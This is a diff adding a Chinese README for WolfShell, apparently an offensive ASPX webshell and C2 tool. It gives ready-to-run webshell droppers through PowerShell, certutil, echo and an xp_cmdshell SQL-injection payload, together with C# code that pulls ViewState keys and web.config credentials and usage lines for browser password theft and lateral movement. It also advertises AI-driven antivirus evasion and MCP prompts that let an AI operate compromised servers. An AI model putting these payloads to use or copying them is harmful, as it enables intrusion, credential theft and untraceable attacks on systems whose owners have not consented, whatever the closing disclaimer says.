@@ -1,0 +1,728 @@
+
+![WolfShell](wolfshell.jpg)
+
+[![Author](https://img.shields.io/badge/Author-0x7556-blueviolet)](https://github.com/0x7556) 
+[![WolfShell](https://img.shields.io/badge/WolfShell-Bin-ff69b4)](https://github.com/0x7556/wolfshell/releases) 
+[![GitHub issues](https://img.shields.io/github/issues/0x7556/wolfshell)](https://github.com/0x7556/wolfshell/issues) 
+[![Github Stars](https://img.shields.io/github/stars/0x7556/wolfshell)](https://github.com/0x7556/wolfshell) 
+[![GitHub forks](https://img.shields.io/github/forks/0x7556/wolfshell)](https://github.com/0x7556/wolfshell)
+[![GitHub license](https://img.shields.io/github/license/0x7556/wolfshell)](https://github.com/0x7556/wolfshell)
+
+## 🐺 幽狼·传说
+
+传说，在每一行代码的阴影里，蛰伏着一头来自深渊的**狼**。它以**废弃的字节**为食，以**破碎的协议**为巢。无人得见其形，只因它的**爪痕从不留在日志之上**。它不追逐光，不咆哮于风，只等**那扇虚掩的门扉**。当**门缝透出权限的微光**，幽狼便**悄然而至**——那时，**所有告警沉默，所有进程沉睡**，仿佛整个世界都不曾察觉。唯有虚空记得：**幽狼已至，万物无声。**
+
+---
+
+## WolfShell：首款支持AI渗透的高级WebShell & C2管理工具
+
+WolfShell(幽狼)是一款为微软 **.NET/ASPX** 环境打造的高级 **WebShell** 与 **C2 管理工具**，面向安全研究与渗透测试（**红队**）使用，提供强大的**命令执行**、**提权**与**内网穿透**能力；内置大量渗透工具并集成 **AI 智能渗透** 辅助，支持**内存加载**、**无文件落地**操作，从而实现**高隐蔽性**的内网渗透与灵活扩展。
+
+
+
+## 🚀 核心优势
+*   AI智能渗透：支持使用自然语言指挥AI操作WebShell执行命令进行渗透。
+*   高效隐蔽的通信： 采用 二进制流 传输协议，确保通信的高效性与隐蔽性。
+*   端到端安全加密： 所有传输 Payload 均经过 AES加密 保护，且每次通信使用 随机密钥，保障数据安全。
+*   无痕运行： 支持直接在 内存中加载并执行代码，最大程度避免在磁盘留下痕迹，显著提升操作隐蔽性和安全性。
+*   内网级联WebShell控制： 通过现有已控的WebShell，无需部署代理或配置端口转发，即可连接控制更深层内网环境中的WebShell。
+*   Hacking后渗透：通过已控的 WebShell 在内存中加载渗透工具，无需部署代理或配置端口转发，即可实现便捷高效的内网横向渗透。
+*   语言特征: 服务端(webshell)及payload均为纯英文，只有提供的WebShell变种文件包含英文、日文、韩文。
+
+## 🔥 功能特性
+
+*   Shell：支持[ASPX](shell/aspx)、[ASHX](shell/ashx)、ASMX、[内存马](shell/mem)、[EXE](shell/wolf.cs)、[PowerShell](shell/wolf.ps1)、DLL、MSbuild、ysoserial反序列化等9种类型)。
+*   正向马：支持个人机植入正向后门级联控制整个内网，[EXE](shell/wolf.cs)、[PS1](shell/wolf.ps1)、DLL、MSbuild等，支持IIS端口复用。
+*   内存马：ASPX一键注入内存马，任意路径访问，每次都可修改shell地址连接，干扰蓝队分析。
+*   Cmd命令执行： 在目标系统上直接执行任意 CMD 命令。魔改whoami防止被EDR记录并报警。
+*   文件管理： 在目标系统上枚举目录文件、新建文件、文件上传、EXE执行、重命令、删除、设置文件时间等。
+*   PowerShell执行： 支持执行 PowerShell 代码和命令。魔改whoami防止被EDR记录并报警。
+*   Shellcode执行： 可在目标环境内直接执行原生的 Shellcode，一键上线Cobalt Strike、Metasploit。
+*   .NET程序执行： 支持内存加载执行自定义.NET程序集，快速扩展后渗透能力。
+*   内存加载扫描器： 只需研发单个IP的.NET程序，通过该模块即可变成内存加载的C段扫描器。
+*   C#代码执行： 支持动态加载与执行 C# 代码，复制案例代码，给AI修改快速扩充战力。
+*   ValidationKey：提取ValidationKey、Validation、DecryptionKey等ViewState反序列化信息。
+*   web.config读取：提取数据库连接信息（数据库名、用户、密码）、SMTP/邮件服务器用户密码等。
+*   端口转发： 实现本地端口到远程内网主机的映射，方便安全地访问内部网络服务。
+*   HTTP代理： 一键内存注入Suo5高性能 HTTP 隧道代理工具。
+*   EfsPotato： 利用系统服务漏洞进行权限提升。
+*   BadPotato： 利用系统服务漏洞进行权限提升。
+*   内网级联Cmd命令执行： 支持级联内网第2层 WebShell 执行 CMD 命令进行横向移动。
+*   内网级联PowerShell执行： 支持级联内网第2层 WebShell 执行 PowerShell 命令进行横向移动。
+*   SshCmd：SSH 远程命令执行工具，支持对内网主机的命令执行、文件上传下载实现横向移动。
+*   MysqlCmd：MySQL 数据库连接工具，支持连接内网MySQL，执行查询、导入导出等数据库操作。
+*   MssqlCmd：SQL Server数据库连接工具，支持连接内网数据库，执行查询、导入导出、横向移动、命令执行、Potato提权等。
+*   SharpWeb：浏览器凭据抓取工具，支持提取已保存的 Chrome、Firefox、Edge 登录信息与凭据。
+*   密码读取: IISpwd wifipwd FileZillaPwd firefoxpwd XshellPwd GetPwd FirefoxHistory FirefoxCookie
+*   漏洞检测：MS17010 SMBGhost  HikvisionPoc ActivemqPoc Struts2Poc WeblogicPoc CVE-2022-36537  CVE-2024-47176 CVE-2022-27925 CVE-2024-27956
+*   横向工具：wshell SmbExec WmiExec WmiExec2 AtExec MssqlCmd MmcExec ShellExec ShellBrowserExec
+*   AI免杀：接入AI人工智能，聊个天就能免杀WebShell。
+*   Ladon：内网渗透工具集，内存加载无文件落地，包含端口扫描、资产探测、密码审计、漏洞检测、漏洞利用、横向移动等。(工具在集成中，目前已完成10多种协议资产探测，其它模块暂未支持，和potato一样，无法集成所有工具，有些功能可能得使用原程序)
+*   AddUser： 绕过杀软EDR\XDR添加系统用户、管理员、域用户、域管理员工具。
+*   NoPowerShell：禁用或没有PowerShell执行PowerShell命令、代码、文件功能。
+
+## 辅助功能
+
+### AI人工智能
+
+*   AI免杀：接入AI人工智能，聊个天就能免杀WebShell。
+*   AI渗透：内置MCP服务器，使用自然语言指挥AI后渗透。
+
+### 加密解密
+
+*   支持加密算法： BASE64、HEX、ASCII、PowerShell、MD5、SHA1、SHA256、URL编码
+*   支持解密算法： BASE64、HEX、ASCII、PowerShell、URL编码
+
+## 安装与使用
+
+1. **下载WolfShell**
+```bash
+git clone https://github.com/0x7556/wolfshell.git
+```
+
+2. **目标环境**
+   - 确保目标环境支持ASPX、ASHX、ASMX等脚本
+   - .NET >= 3.5,Windows 7-Windows 2026
+
+3. **上传WolfShell**
+   - 将WolfShell文件上传到目标服务器，客户端支持生成ASPX、ASHX、内存马等9种类型。
+   - WebShell脚本: https://github.com/0x7556/wolfshell/tree/main/shell
+
+4. **访问WebShell**
+   - 通过工具客户端连接WebShell，默认密码 WolfShell，修改密码可使用工具上的WolfHash加密。
+
+## 使用环境
+
+### 客户端
+- **本机操作系统：** Windows 7-Windows 2026
+- **本机.NET 版本：** .NET Framework 4.8
+
+### Shell
+- **目标操作系统：** Windows 7-Windows 2026
+- **目标.NET 版本：** >=.NET Framework 3.5
+
+## 漏洞 通用GetShell命令
+
+具备命令执行或SQL注入条件时，可通过以下6种方法写入 幽狼 WebShell
+![exeloader](img/ShellBuild.png)
+
+### PowerShell写入WebShell wolf.aspx
+
+```bash
+powershell -Command "Set-Content -Path 'wolf.aspx' -Value '<%@ Page Language=\"C#\" %><%if (Request.Cookies.Count != 0) { byte[] k = Encoding.Default.GetBytes(\"ca63457538b9b1e0\"); System.IO.Stream s = Request.InputStream; byte[] c = new byte[s.Length]; s.Read(c, 0, c.Length); System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(\"K\").Equals(this); }%>'"
+```
+### PowerShell命令 Base64写入WebShell wolf.aspx
+
+```bash
+powershell -EncodedCommand UwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAIgB3AG8AbABmAC4AYQBzAHAAeAAiACAALQBWAGEAbAB1AGUAIAAnADwAJQBAACAAUABhAGcAZQAgAEwAYQBuAGcAdQBhAGcAZQA9ACIAQwAjACIAIAAlAD4APAAlAGkAZgAgACgAUgBlAHEAdQBlAHMAdAAuAEMAbwBvAGsAaQBlAHMALgBDAG8AdQBuAHQAIAAhAD0AIAAwACkAIAB7ACAAYgB5AHQAZQBbAF0AIABrACAAPQAgAEUAbgBjAG8AZABpAG4AZwAuAEQAZQBmAGEAdQBsAHQALgBHAGUAdABCAHkAdABlAHMAKAAiAGMAYQA2ADMANAA1ADcANQAzADgAYgA5AGIAMQBlADAAIgApADsAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtACAAcwAgAD0AIABSAGUAcQB1AGUAcwB0AC4ASQBuAHAAdQB0AFMAdAByAGUAYQBtADsAIABiAHkAdABlAFsAXQAgAGMAIAA9ACAAbgBlAHcAIABiAHkAdABlAFsAcwAuAEwAZQBuAGcAdABoAF0AOwAgAHMALgBSAGUAYQBkACgAYwAsACAAMAAsACAAYwAuAEwAZQBuAGcAdABoACkAOwAgAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQAuAEwAbwBhAGQAKABuAGUAdwAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBSAGkAagBuAGQAYQBlAGwATQBhAG4AYQBnAGUAZAAoACkALgBDAHIAZQBhAHQAZQBEAGUAYwByAHkAcAB0AG8AcgAoAGsALAAgAGsAKQAuAFQAcgBhAG4AcwBmAG8AcgBtAEYAaQBuAGEAbABCAGwAbwBjAGsAKABjACwAIAAwACwAIABjAC4ATABlAG4AZwB0AGgAKQApAC4AQwByAGUAYQB0AGUASQBuAHMAdABhAG4AYwBlACgAIgBLACIAKQAuAEUAcQB1AGEAbABzACgAdABoAGkAcwApADsAIAB9ACUAPgAnAA==
+```
+
+### cmd命令 echo & certutil 写入WebShell wolf.aspx
+
+```bash
+echo 3c25402050616765204c616e67756167653d2243232220253e3c2569662028526571756573742e436f6f6b6965732e436f756e7420213d203029207b20627974655b5d206b203d20456e636f64696e672e44656661756c742e476574427974657328223961613337623163323561303834653022293b2053797374656d2e494f2e53747265616d2073203d20526571756573742e496e70757453747265616d3b20627974655b5d2063203d206e657720627974655b732e4c656e6774685d3b20732e5265616428632c20302c20632e4c656e677468293b2053797374656d2e5265666c656374696f6e2e417373656d626c792e4c6f6164286e65772053797374656d2e53656375726974792e43727970746f6772617068792e52696a6e6461656c4d616e6167656428292e437265617465446563727970746f72286b2c206b292e5472616e73666f726d46696e616c426c6f636b28632c20302c20632e4c656e67746829292e437265617465496e7374616e636528224b22292e457175616c732874686973293b207d253e > w.hex && certutil -f -decodehex w.hex wolf.aspx && del w.hex
+```
+
+### cmd命令 echo 写入WebShell wolf.aspx
+
+```bash
+echo ^<%@ Page Language="C#" %^> > wolf.aspx && echo ^<% if (Request.Cookies.Count != 0) { >> wolf.aspx && echo byte[] k = Encoding.Default.GetBytes("ca63457538b9b1e0"); >> wolf.aspx && echo System.IO.Stream s = Request.InputStream; >> wolf.aspx && echo byte[] c = new byte[s.Length]; >> wolf.aspx && echo s.Read(c, 0, c.Length); >> wolf.aspx && echo System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("K").Equals(this); >> wolf.aspx && echo } %^> >> wolf.aspx
+```
+
+### SQL注入 xp_cmdshell写入WebShell wolf.aspx
+
+```bash
+'; EXEC xp_cmdshell 'echo ^<%@ Page Language="C#" %^> > C:\inetpub\wwwroot\wolf.aspx && echo ^<% if (Request.Cookies.Count != 0) {>> C:\inetpub\wwwroot\wolf.aspx && echo byte[] k = Encoding.Default.GetBytes("ca63457538b9b1e0");>> C:\inetpub\wwwroot\wolf.aspx && echo System.IO.Stream s = Request.InputStream;>> C:\inetpub\wwwroot\wolf.aspx && echo byte[] c = new byte[s.Length];>> C:\inetpub\wwwroot\wolf.aspx && echo s.Read(c, 0, c.Length);>> C:\inetpub\wwwroot\wolf.aspx && echo System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("K").Equals(this);>> C:\inetpub\wwwroot\wolf.aspx && echo } %^> >> C:\inetpub\wwwroot\wolf.aspx'; --
+```
+
+### 编译EXE程序正向马C2
+```bash
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:wolf.exe wolf.cs
+```
+PS：可自行修改，添加启动项，实现持久化，结合级联功能，内网横行。 也可以根据该代码修改成DLL，通过DLL劫持级联控制内网多台机器。
+
+### PowerShell正向马C2
+```bash
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File wolf.ps1
+```
+### IIS端口复用后门
+
+若目标存在IIS，不管是PowerShell还是exe版，均支持端口复用
+
+
+## 功能示例
+
+### 自定义.NET程序执行
+
+.NET程序执行： 支持内存加载执行自定义.NET程序集，快速扩展后渗透能力。
+![exeloader](img/ExeLoader.png)
+
+# AI人工智能
+
+## AI智能免杀 
+使用AI兔杀幽狼 WebShell 服务端
+![aicode](img/aicode.png)
+
+## AI智能渗透
+
+    
+ ### Cherry Studio MCP配置
+
+ ```json
+  "mcpServers": {
+    "xf5pBIECy50rKmx53Gy7n": {
+      "name": "WolfShellMCP",
+      "type": "stdio",
+      "description": "",
+      "isActive": true,
+      "command": "C:\\Users\\Administrator\\Downloads\\wolfshell-main\\WolfShellMCP.exe",
+      "args": [],
+      "env": {
+        "WOLFSHELL_API": "http://127.0.0.1:7556"
+      }
+    }
+```
+
+* 其它客户端同理，欢迎提交其它客户端配置代码，跨平台MCP，支持Windows/Linux/MacOS等操作系统
+* Kali下使用请下载 lnx 版本，环境变量 WOLFSHELL_API 设置成 幽狼 所在Windows机器的远程API地址
+* 幽狼AI Shell MCP：https://github.com/0x7556/PentestMCP/releases/tag/wolfshellmcp3.4
+
+### 启动AI智能服务器API
+点击幽狼Shell工具标签“AI->MCP”,找到按钮“API MCP Server”
+![img](https://github.com/0x7556/wolfshell/blob/main/img/ai/WolfShell_API.png)
+
+### 1. AI渗透 通过幽狼 Shell 执行 CMD 命令（使用 Shell 地址和密码）  
+配合相关漏洞让AI自动获取shell，以成功执行命令为验收标准，防止AI幻觉或检测200状态误报为成功GetShell。
+**示例提示词：**
+
+- 使用幽狼 http://192.168.50.106/shell.aspx Wolf8888 执行 CMD 命令： whoami
+- 使用幽狼 http://192.168.1.11/wolf.aspx WolfShell 执行 CMD 命令：查看系统信息
+
+![img](https://github.com/0x7556/wolfshell/blob/main/img/ai/WolfShellMcpCmd.png)
+
+
+
+### 2. AI渗透 通过幽狼客户端预配置的 ID 执行 CMD 命令  
+优点不会向AI泄露目标Shell和密码
+**示例提示词：**
+- 使用幽狼 ID 为 9 的 Shell 执行 CMD 命令：查看当前用户
+
+![img](https://github.com/0x7556/wolfshell/blob/main/img/ai/WolfShellMcpCmdID.png)
+
+
+
+### 3. AI渗透 通过幽狼 Shell 执行 PowerShell 命令（使用 Shell 地址和密码）  
+配合相关漏洞让AI自动获取shell，以成功执行命令为验收标准，防止AI幻觉或检测200状态误报为成功GetShell。
+**示例提示词：**
+- 使用幽狼 http://192.168.1.11/wolf.aspx WolfShell 执行 PowerShell 命令：whoami  
+- 使用幽狼 http://192.168.1.11/wolf.aspx WolfShell 执行 PowerShell 命令：查看系统信息
+
+![img](https://github.com/0x7556/wolfshell/blob/main/img/ai/WolfShellMcpCmdWhoami.png)
+
+### 4. AI渗透 通过幽狼客户端预配置的 ID 执行 PowerShell 命令
+优点不会向AI泄露目标Shell和密码
+**示例提示词：**
+- 使用幽狼 ID 为 9 的 Shell 执行 PowerShell 命令：ipconfig  
+- 使用幽狼 ID 为 9 的 Shell 执行 PowerShell 命令：查看当前 IP
+
+![img](https://github.com/0x7556/wolfshell/blob/main/img/ai/WolfShellMcpPS1.png)
+
+### 5. AI渗透 幽狼 WolfShell 视频演示
+https://github.com/0x7556/hackvideo/blob/main/Wolf%20AI%20Shell.mov
+
+### 6. AI渗透 幽狼 文件上传
+
+**示例提示词：**
+- 使用幽狼 http://192.168.50.106/shell.aspx Wolf8888  上传文件  C:\Users\Administrator\Desktop\TestTest\wolf.exe  到目标 的Public目录
+- 使用幽狼 ID为9 执行  上传文件  C:\Users\Administrator\Desktop\TestTest\wolf.exe 到目标 的Public目录
+
+![img](https://github.com/0x7556/wolfshell/blob/main/img/ai/ai_uploadfile.png)
+
+### 7. AI渗透 幽狼 EfsPotato提权
+
+**示例提示词：**
+- 使用幽狼 ID为9 执行EfsPotato执行 whoami
+- 使用幽狼 http://192.168.50.106/shell.aspx Wolf8888 EfsPotato执行 whoami
+
+![img](https://github.com/0x7556/wolfshell/blob/main/img/ai/ai_efspotato.png)
+
+### 8. AI渗透 幽狼 BadPotato提权
+
+**示例提示词：**
+- 使用幽狼 ID为9 执行 BadPotato执行 whoami
+- 使用幽狼 http://192.168.50.106/shell.aspx Wolf8888 BadPotato执行 whoami
+
+![img](https://github.com/0x7556/wolfshell/blob/main/img/ai/ai_badpotato.png)
+
+
+## 级联控制内网Shell & C2
+
+### 级联内网第3层WebShell 执行Cmd命令 
+
+通过入口点 192.168.50.106 级联内网 192.168.50.159 再次级联下一层内网 192.168.50.69 WebShell 执行命令 
+
+PS: 当然也可级联外网，比如抓了一些服务器当跳板，真正要搞的目标在第3层，这样就很难被追踪或溯源到你的真实IP了
+
+![CmdShell示例](img/Lan2CmdShell.png)
+
+### 级联内网第2层WebShell 执行Cmd命令
+
+通过入口点 192.168.50.159 级联内网 192.168.50.106 WebShell执行命令
+
+![CmdShell示例](img/LanCmdShell.png)
+
+
+### WebShell入口点 执行Cmd命
+
+![CmdShell示例](img/CmdShell.png)
+
+### WebShell入口点 执行PowerShell命令/代码
+* whoami代码实现非系统whoami
+* 支持命令执行、代码执行 长度9K
+* 输入info、ver可查看操作系统版本、位数、.NET版本、PowerShell版本信息
+* 输入whoami、username可自动转成对应powershell代码查看用户信息
+* Base64加密代码执行 示例 base64:ZWNobyBXb2xmU2hlbGw=
+
+```csharp
+PS C:\Users\admin>whoami
+whoami: IIS APPPOOL\DefaultAppPool
+Username: WIN-021V7TK43N5$
+
+PS C:\Users\admin>info
+Operating System Version: Microsoft Windows Server 2019 Datacenter 64 bit
+Version Number: 10.0.17763
+
+PowerShell Version:
+5.1.17763.1
+
+.NET Detailed Versions:
+PSChildName Version   Release
+----------- -------   -------
+Client      4.7.03190  461814
+
+PS C:\Users\admin>base64:ZWNobyBXb2xmU2hlbGw=
+WolfShell
+
+PS C:\Users\admin>Write-Host "Current User:`n$env:USERNAME"
+Current User:
+WIN-021V7TK43N5$
+```
+
+![PowerShell示例](img/PowerShell.png)
+
+
+### 文件管理
+
+![FileMgr](img/FileMgr.png)
+
+
+### C#代码执行
+
+#### 获取 ValidationKey 示例代码
+
+*   ValidationKey：提取ValidationKey、Validation、DecryptionKey等ViewState反序列化信息
+
+```csharp
+
+using System;
+using System.Reflection;
+using System.Web.Configuration;
+public class Eval
+{
+public string eval(Object obj)
+{
+var sy = Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
+var mkt = sy.GetType("System.Web.Configuration.MachineKeySection");
+var gac = mkt.GetMethod("GetApplicationConfig", BindingFlags.Static | BindingFlags.NonPublic);
+var cg = (MachineKeySection)gac.Invoke(null, new object[0]);
+return "ValidationKey: " + cg.ValidationKey + " | " + "Validation: " + cg.Validation + " | " + "DecryptionKey: " + cg.DecryptionKey + " | " + "Decryption: " + cg.Decryption + " | " + "CompatibilityMode: " + cg.CompatibilityMode;
+}
+}
+
+```
+
+![C#代码示例](img/CodeViewKey.png)
+
+#### 扫描C段存活主机 示例代码
+```csharp
+
+using System;
+using System.Net;
+using System.Net.NetworkInformation;
+using System.Text;
+using System.Threading.Tasks;
+public class Eval
+{
+public string eval(Object obj)
+{
+StringBuilder iplist = new StringBuilder();
+string baseIP = "192.168.1.";
+PingOptions options = new PingOptions();
+options.DontFragment = true;
+var tasks = new Task[254];
+for (int i = 1; i < 255; i++)
+{
+int ipSuffix = i;
+tasks[i - 1] = Task.Run(() =>
+{
+using (Ping myPing = new Ping())
+{
+PingReply reply = myPing.Send(baseIP + ipSuffix, 120);
+if (reply.Status == IPStatus.Success)
+{
+lock (iplist)
+{
+iplist.AppendLine("Alive IP: " + reply.Address.ToString());
+}
+}
+}
+});
+}
+Task.WaitAll(tasks);
+return iplist.ToString();
+}
+}
+
+
+```
+
+
+![C#代码示例](img/CodeCping.png)
+
+
+
+#### CMD命令执行 示例代码
+
+```csharp
+
+using System;
+using System.Diagnostics;
+public class Eval
+{
+public string eval(Object obj)
+{
+try
+{
+Process process = new Process();
+process.StartInfo.FileName = "cmd.exe";
+process.StartInfo.Arguments = "/c whoami";
+process.StartInfo.UseShellExecute = false;
+process.StartInfo.RedirectStandardOutput = true;
+process.Start();
+string result = process.StandardOutput.ReadToEnd();
+process.WaitForExit();
+return result;
+}
+catch (Exception ex)
+{
+return "Error occurred: " + ex.Message;
+}
+}
+}
+
+
+```
+
+![C#代码示例](img/CodeCmd.png)
+
+
+#### 获取web.config密码 示例代码
+
+*   web.config读取：提取数据库连接信息（数据库名、用户、密码）、SMTP/邮件服务器用户密码等。
+
+```csharp
+
+using System;
+using System.Configuration;
+using System.Text;
+public class Eval
+{
+public string eval(Object obj)
+{
+try
+{
+var connectionStrings = ConfigurationManager.ConnectionStrings;
+var appSettings = ConfigurationManager.AppSettings;
+var result = new StringBuilder();
+foreach (ConnectionStringSettings connectionString in connectionStrings)
+{
+result.AppendLine("Connection string name: " + connectionString.Name);
+result.AppendLine("Connection string value: " + connectionString.ConnectionString);
+result.AppendLine();
+}
+result.AppendLine();
+foreach (string key in appSettings.AllKeys)
+{
+result.AppendLine("Key: " + key + ", Value: " + appSettings[key]);
+}
+return result.ToString();
+}
+catch (Exception ex)
+{
+return "Error occurred: " + ex.Message;
+}
+}
+}
+
+
+```
+
+![C#代码示例](img/CodeWebConfig.png)
+
+
+###  加密解密算法
+
+支持加密算法： BASE64、HEX、ASCII、PowerShell、MD5、SHA1、SHA256、URL编码
+支持解密算法： BASE64、HEX、ASCII、PowerShell、URL编码
+
+#### 幽狼密码
+
+![WolfHash](img/WolfHash.png)
+
+#### ASCII码加密
+
+![WolfShell](img/ascii.png)
+
+#### BASE64解密
+
+![WolfShell](img/unBase64.png)
+
+#### HEX十六进制解密
+
+![WolfShell](img/unhex.png)
+
+
+
+### Potato提权示例
+
+#### efspotato提权
+
+![EfsPotato示例](img/EfsPotato.png)
+
+#### badpotato提权
+
+
+![BadPotato示例](img/BadPotato.png)
+
+### 内网扫描示例
+
+![NetScan示例](img/NetScan.png)
+
+### 端口转发示例
+
+![端口转发示例](img/PortTran.png)
+
+
+### HTTP代理示例
+
+![端口转发示例](img/Suo5Tunnel.png)
+
+## Hacking后渗透
+
+### SSH远程命令执行示例
+
+```bash
+Usage:
+
+sshcmd 192.168.50.128 22 root toor id
+sshcmd 192.168.50.128 22 root toor download /tmp/down.rar c:\down.rar
+sshcmd 192.168.50.128 22 root toor upload c:\upload.rar /tmp/upload.rar
+
+Keybord
+sshcmd 192.168.50.128 22 root toor download2 /tmp/down.rar c:\down.rar
+sshcmd 192.168.50.128 22 root toor upload2 c:\upload.rar /tmp/upload.rar
+```
+
+![Hacking](img/sshcmd.png)
+
+### Mysql数据库连接示例
+
+```bash
+mysqlcmd host port user pass dbname sqlstr
+mysqlcmd host port user pass dbname sqlb64
+
+Demo:
+mysqlcmd 192.168.50.139 3306 root WolfShell mysql info
+mysqlcmd 192.168.50.139 3306 root WolfShell mysql ""SELECT VERSION(); ""
+mysqlcmd 192.168.50.139 3306 root WolfShell mysql ""SELECT 3+5 ""
+mysqlcmd 192.168.50.139 3306 root WolfShell mysql c2VsZWN0IDMrNQ==";
+```
+
+![Hacking](img/mysqlcmd.png)
+
+### 读取浏览器密码示例
+
+*   SharpWeb：浏览器凭据抓取工具，支持提取已保存的 Chrome、Firefox、Edge 登录信息与凭据。
+
+```bash
+Usage:
+    SharWeb arg0 [arg1 arg2 ...]
+
+Arguments:
+    all       - Retrieve all Chrome, FireFox and IE/Edge credentials.
+    full      - The same as 'all'
+    chrome    - Fetch saved Chrome logins. e.g. -d Directory
+    firefox   - Fetch saved FireFox logins. e.g. -p masterkey -d Directory
+    edge      - Fetch saved Internet Explorer/Microsoft Edge logins.
+
+Demo:
+    SharWeb all
+    SharWeb chrome
+    SharWeb chrome -d C:\Output
+    SharWeb firefox -p mymasterkey -d C:\Output
+    SharWeb edge
+=======================================================================
+```
+
+![Hacking](img/SharpWeb.png)
+
+### Ladon内网渗透工具示例
+20251106 主要集成以下探测功能，其它功能暂未支持
+
+```bash
+Usage:
+
+Ladon whoami
+
+Ladon 192.168.50.159/24 ICMP         ICMP存活主机探测
+Ladon 192.168.50.159/24 PortScan     开放端口服务扫描
+Ladon 192.168.50.159/24 WebScan      网站标题、中间件
+
+Ladon 192.168.50.159/24 SmbInfo      SMB存活主机探测、NTLM系统信息
+Ladon 192.168.50.159/24 NbtInfo      NBT存活主机探测、NTLM系统信息
+Ladon 192.168.50.159/24 WmiInfo      WMI存活主机探测、NTLM系统信息
+Ladon 192.168.50.159/24 LdapInfo     LDAP存活主机探测、NTLM系统信息
+Ladon 192.168.50.159/24 RdpInfo      RDP存活主机探测、NTLM系统信息
+Ladon 192.168.50.159/24 SmtpInfo     SMTP存活主机探测、NTLM系统信息
+Ladon 192.168.50.159/24 HttpInfo     HTTP存活主机探测、NTLM系统信息
+Ladon 192.168.50.159/24 WinrmInfo    Winrm存活主机探测、NTLM系统信息
+Ladon 192.168.50.159/24 MssqlInfo    SQL数据库主机探测、NTLM系统信息
+
+Ladon 192.168.50.159/24 FtpInfo      FTP存活主机探测
+Ladon 192.168.50.159/24 T3Info       Weblogic协议探测
+Ladon 192.168.50.159/24 CiscoInfo    Cisco路由器探测
+Ladon 192.168.50.159/24 SnmpInfo   SNMP设备探测，如路由器、交换机等
+
+Ladon 192.168.50.159/24 OxidInfo     Windows多网卡主机探测
+Ladon 192.168.50.159/24 EthInfo      Windows多网卡主机探测
+Ladon http://0x7556.org WPinfo     WordPress版本、插件探测、漏洞
+Ladon 192.168.50.159/24 DnsInfo      DNS存活主机探测、域名识别
+
+
+```
+
+#### SMB协议NTLM信息OS操作系统识别
+![Hacking](img/SmbInfo.png)
+
+#### WebScan 网站标题、中间件扫描
+![Hacking](img/WebScan.png)
+
+
+### 端口扫描 示例
+
+
+```bash
+
+PortScan 192.168.50.159
+PortScan 192.168.50.159 80，22，135，445
+
+```
+
+![Hacking](img/PortScan.png)
+
+## MS17010 漏洞检测
+
+![WolfShell](img/ms17010.png)
+
+
+## SQL Server横向移动 数据库提权
+
+![WolfShell](img/MssqlCmd.png)
+
+
+## Xshell密码读取
+
+![WolfShell](img/XshellPwd.png)
+
+
+## webkey 密码读取
+
+解析web.config 获取ValidationKey (ViewState反序列化 Exchange、SharePoint后门)
+
+![WolfShell](img/webkey.png)
+
+## CVE-2025-55182 Next.js Rce 漏洞利用
+[+]CVE-2025-55182	CVE-2025-55182 Next.js Rce 漏洞利用
+[+]NextJSexp		CVE-2025-55182 Next.js Rce 漏洞利用
+
+![WolfShell](img/nextjsexp.png)
+
+## CVE-2026-48907  Joomla JCE Editor RCE漏洞检测
+[+]CVE-2026-48907 http://target.com
+
+![WolfShell](img/CVE-2026-48907.png)
+
+## EXP本地使用
+
+本机使用 Hacking 里的工具EXP,运行HackTest.exe后，添加Shell: http://127.0.0.1:8080/wolfshell
+右键---Hacking后渗透工具集---点击对应工具EXP，就出现工具用法，文本框输入命令执行
+
+## 内存加载 内网扫描器
+
+### 内存加载扫描器
+* 只需研发单个IP的.NET程序，通过该模块即可变成内存加载的C段扫描器。
+* 如只需实现对1个IP的检测、漏洞利用等工具，注意：类和方法需为 Public
+
+#### 自定义工具 原始用法
+```bash
+F:\py>urltitle.exe 192.168.50.1
+URL: http://192.168.50.1/ | Status: 200 | Banner: httpd/2.0 | Title: No Title
+```
+
+
+#### 远程内存加载 变身 内网C段扫描器
+
+使用方法：
+1. 将目标 EXE 拖放到“ExePath”文件路径输入框。  
+2. 在“C 段”输入框中填写要扫描的网段（例如 192.168.1.0/24）。  
+3. 点击“Scan”按钮开始扫描。扫描行为和结果由所加载的 EXE 功能决定。  
+
+说明：
+- 加载器默认先通过 ICMP（ping）探测目标是否存活，只有存活的主机才会被加载并执行自定义 EXE。  
+- 若目标网络禁用 ICMP 响应，请取消勾选“先行探测/ICMP”选项以跳过探测步骤。
+-- 
+![image](https://github.com/0x7556/wolfshell/blob/main/img/memLoadScan.png)
+
+#### 内存加载扫描器 内置MS17010漏洞检测
+![image](https://github.com/0x7556/wolfshell/blob/main/img/memLoadScan_ms17010.png)
+
+## 免责声明
+
+- 使用WolfShell时，请遵循相关法律法规，确保在授权的环境中进行测试和使用。
+- 本工具仅供教育和研究目的，任何滥用行为将由用户自行承担后果。
+
+## 问题反馈
+
+欢迎任何形式的贡献！请提交问题、建议或拉取请求。
+
+## 许可证
+
+本项目采用MIT许可证，详细信息请参见[LICENSE](LICENSE)文件。
+
+## 资源链接
+
+已集成或即将加入的工具，工具采用内存加载，有些工具未解决兼容性问题，如(SweetPotato\GodPotato，可能得上传目标在cmd下执行)
+
+* Ladon（内网渗透框架）：https://github.com/k8gege/Ladon    (功能非常丰富，正在研究中)
+* gpt4free（AI免费API）：https://github.com/xtekky/gpt4free
+* SharpWeb(浏览器密码读取)：https://github.com/djhohnstein/SharpWeb
+* suo5代理(HTTP隧道代理)：https://github.com/zema1/suo5
+* BadPotato(提权工具)：https://github.com/BeichenDream/BadPotato
